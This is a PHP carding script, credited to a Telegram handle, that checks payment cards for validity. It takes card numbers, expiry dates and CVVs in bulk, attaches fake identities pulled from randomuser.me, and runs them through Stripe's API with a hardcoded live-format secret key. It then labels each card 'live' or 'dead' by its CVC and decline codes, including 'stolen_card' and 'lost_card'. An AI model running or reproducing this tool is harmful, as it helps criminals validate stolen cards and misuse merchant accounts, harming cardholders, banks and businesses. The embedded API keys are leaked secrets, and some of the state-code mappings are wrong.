<?php
//Script Author: ᴛɪᴋᴏʟ4ʟɪғᴇ https://t.me/Tikol4Life

/*===[PHP Setup]==============================================*/
error_reporting(0);
ini_set('display_errors', 0);


$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
$infos = json_decode($get, 1);
$name_first = $infos['results'][0]['name']['first'];
$name_last = $infos['results'][0]['name']['last'];
$name_full = ''.$name_first.' '.$name_last.'';

$location_street = $infos['results'][0]['location']['street'];
$location_city = $infos['results'][0]['location']['city'];
$location_state = $infos['results'][0]['location']['state'];
$location_postcode = $infos['results'][0]['location']['postcode'];
if ($location_state == "alabama") {
    $location_state = "AL";
} else if ($location_state == "alaska") {
    $location_state = "AK";
} else if ($location_state == "arizona") {
    $location_state = "AR";
} else if ($location_state == "california") {
    $location_state = "CA";
} else if ($location_state == "colorado") {
    $location_state = "CO";
} else if ($location_state == "connecticut") {
    $location_state = "CT";
} else if ($location_state == "delaware") {
    $location_state = "DE";
} else if ($location_state == "district of columbia") {
    $location_state = "DC";
} else if ($location_state == "florida") {
    $location_state = "FL";
} else if ($location_state == "georgia") {
    $location_state = "GA";
} else if ($location_state == "hawaii") {
    $location_state = "HI";
} else if ($location_state == "idaho") {
    $location_state = "ID";
} else if ($location_state == "illinois") {
    $location_state = "IL";
} else if ($location_state == "indiana") {
    $location_state = "IN";
} else if ($location_state == "iowa") {
    $location_state = "IA";
} else if ($location_state == "kansas") {
    $location_state = "KS";
} else if ($location_state == "kentucky") {
    $location_state = "KY";
} else if ($location_state == "louisiana") {
    $location_state = "LA";
} else if ($location_state == "maine") {
    $location_state = "ME";
} else if ($location_state == "maryland") {
    $location_state = "MD";
} else if ($location_state == "massachusetts") {
    $location_state = "MA";
} else if ($location_state == "michigan") {
    $location_state = "MI";
} else if ($location_state == "minnesota") {
    $location_state = "MN";
} else if ($location_state == "mississippi") {
    $location_state = "MS";
} else if ($location_state == "missouri") {
    $location_state = "MO";
} else if ($location_state == "montana") {
    $location_state = "MT";
} else if ($location_state == "nebraska") {
    $location_state = "NE";
} else if ($location_state == "nevada") {
    $location_state = "NV";
} else if ($location_state == "new hampshire") {
    $location_state = "NH";
} else if ($location_state == "new jersey") {
    $location_state = "NJ";
} else if ($location_state == "new mexico") {
    $location_state = "NM";
} else if ($location_state == "new york") {
    $location_state = "LA";
} else if ($location_state == "north carolina") {
    $location_state = "NC";
} else if ($location_state == "north dakota") {
    $location_state = "ND";
} else if ($location_state == "ohio") {
    $location_state = "OH";
} else if ($location_state == "oklahoma") {
    $location_state = "OK";
} else if ($location_state == "oregon") {
    $location_state = "OR";
} else if ($location_state == "pennsylvania") {
    $location_state = "PA";
} else if ($location_state == "rhode Island") {
    $location_state = "RI";
} else if ($location_state == "south carolina") {
    $location_state = "SC";
} else if ($location_state == "south dakota") {
    $location_state = "SD";
} else if ($location_state == "tennessee") {
    $location_state = "TN";
} else if ($location_state == "texas") {
    $location_state = "TX";
} else if ($location_state == "utah") {
    $location_state = "UT";
} else if ($location_state == "vermont") {
    $location_state = "VT";
} else if ($location_state == "virginia") {
    $location_state = "VA";
} else if ($location_state == "washington") {
    $location_state = "WA";
} else if ($location_state == "west virginia") {
    $location_state = "WV";
} else if ($location_state == "wisconsin") {
    $location_state = "WI";
} else if ($location_state == "wyoming") {
    $location_state = "WY";
} else {
    $location_state = "KY";
}

/*===[Security Setup]=========================================*/

/*===[Variable Setup]=========================================*/

/*===[CC Info Validation]=====================================*/
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$proxySocks4 = $_GET['proxy'];

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false)
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$sk = 'sk_live_W3srEUlUSEgKixDAJqz61xS3';
#$sk = 'sk_live_V3lSrDbwWdzbrt3456LkMNgY';



/*===[cURL Processes]=========================================*/
/* 1st cURL */
$ch1 = curl_init();
curl_setopt($ch1, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch1, CURLOPT_POSTFIELDS, "card[number]=$cc&card[exp_month]=$mes&card[exp_year]=$ano&card[cvc]=$cvv");
echo curl_setopt($ch1, CURLOPT_USERPWD, $sk. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
$curl1 = curl_exec($ch1);
if (curl_errno($ch1)) {
 echo "RESPONE[Curl Error],";
exit();
}
curl_close($ch1);

/* 1st cURL Response */
$res1 = json_decode($curl1, true);
$card = $res1['card']['id'];

if(isset($res1['id'])){
    /* 2nd cURL */
    $ch2 = curl_init();
    curl_setopt($ch2, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch2, CURLOPT_POST, 1);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, 'email='.$email.'&description=Tikol4Life&source='.$res1["id"].'&address[line1]='.$location_street.'&address[city]='.$location_city.'&address[state]='.$location_state.'&address[postal_code]='.$location_postcode.'&address[country]=US');
    curl_setopt($ch2, CURLOPT_USERPWD, $sk . ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
    $curl2 = curl_exec($ch2);
    if (curl_errno($ch2)) {
	    echo "RESPONE[Curl Error],";
		exit();
	}
    curl_close($ch2);

    /* 2nd cURL Response */
    $res2 = json_decode($curl2, true);
    $cus = $res2['id'];

}

if (isset($res2['id'])&&!isset($res2['sources'])) {
    /* 3rd cURL */
    $ch3 = curl_init();
    curl_setopt($ch3, CURLOPT_URL, "https://api.stripe.com/v1/customers/$cus/sources/$card");
    curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch3, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch3, CURLOPT_USERPWD, $sk . ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers);
    $curl3 = curl_exec($ch3);
    if (curl_errno($ch2)) {
	     echo "RESPONE[Curl Error],";
		exit();
	}
    curl_close($ch3);

    /* 3rd cURL Response */
    $res3 = json_decode($curl3, true);

}

$ch4 = curl_init();
    curl_setopt($ch4, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
    curl_setopt($ch4, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch4, CURLOPT_FOLLOWLOCATION, 1);
    $headers4 = array();
    $headers4[] = 'Accept: */*';
    $headers4[] = 'Pragma: no-cache';
    $headers4[] = 'Accept-Version: 3';
    curl_setopt($ch4, CURLOPT_HTTPHEADER, $headers4);
    $curl4 = curl_exec($ch4);
    curl_close($ch4);
   $cur4dec = json_decode($curl4, true);
   $cardcountry = $cur4dec['country']['name'];
   $countryemoji = $cur4dec['country']['emoji'];
   $bankname = $cur4dec['bank']['name'];
   $scheme = $cur4dec['scheme'];
   $cardtype = $cur4dec['type'];



/*===[cURL Response Setup]====================================*/
if(isset($res1['error'])){
    //DEAD
    $code = $res1['error']['code'];
    $decline_code = $res1['error']['decline_code'];
    $message = $res1['error']['message'];

    if(isset($res1['error']['decline_code'])){
        $codex = $decline_code;
    }else{
        $codex = $code;
    }
    $err = ''.$res1['error']['message'].' '.$codex;

    if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
        //CCN LIVE
        echo "RESPONE[incorrect_cvc],";
    }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
        //CVV LIVE: Insufficient Funds
       echo "RESPONE[insufficient_funds],";
    }elseif($code == "lost_card"||$decline_code == "lost_card"){
        //CCN LIVE: Lost Card
        echo "RESPONE[lost_card],";
    }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
        //CCN LIVE: Stolen Card
         echo "RESPONE[stolen_card],";
    }elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
        //TESTMODE CHARGES
        echo "RESPONE[testmode_charges_only],";
    }elseif($res1['error']['type'] == "invalid_request_error"){
        //TESTMODE CHARGES
         echo "RESPONE[invalid_request_error],";
    }elseif(strpos($curl1, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
        //VERIFY NUMBER
        echo "RESPONE[Sending credit card numbers directly to the Stripe API is generally unsafe.],";
    }elseif(strpos($curl1, "You must verify a phone number on your Stripe account before you can send raw credit card numbers to the Stripe API.")){
        //VERIFY NUMBER
        echo "RESPONE[You must verify a phone number on your Stripe account before you can send raw credit card numbers to the Stripe API.],";
    }else{
        //DEAD
        echo "RESPONE[$message ($code)($decline_code)],";
    }
}else{
    if (isset($res2['error'])) {
        //DEAD
        $code = $res2['error']['code'];
        $decline_code = $res2['error']['decline_code'];
        $message = $res2['error']['message'];
        if(isset($res2['error']['decline_code'])){
            $codex = $decline_code;
        }else{
            $codex = $code;
        }
        $err = ''.$res2['error']['message'].' '.$codex;

        if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
            //CCN LIVE
        echo "RESPONE[incorrect_cvc],";
        }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
            //CVV LIVE: Insufficient Funds
            echo "RESPONE[insufficient_funds],";
        }elseif($code == "lost_card"||$decline_code == "lost_card"){
            //CCN LIVE: Lost Card
            echo "RESPONE[lost_card],";
        }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
            //CCN LIVE: Stolen Card
             echo "RESPONE[stolen_card],";
        }else{
            //DEAD
       echo "RESPONE[$message ($code)($decline_code)],";
        }
    }else{
        if (isset($res2['sources'])) {
            $cvc_res2 = $res2['sources']['data'][0]['cvc_check'];
            if($cvc_res2 == "pass"||$cvc_res2 == "success"){
                //CVV MATCH CONGRATS
                 echo "RESPONE[cvv],";
            }else{
                //DEAD
               echo "RESPONE[cvc_check $cvc_res2],";
            }
        }else{
            $cvc_res3 = $res3['cvc_check'];
            if($cvc_res3 == "pass"||$cvc_res3 == "success"){
                //CVV MATCH CONGRATS
                 echo "RESPONE[cvv],";
            }else{
                //DEAD
           echo "RESPONE[cvc_check $cvc_res3],";
            }
        }
    }
}




/*===[PHP Functions]==========================================*/
?>
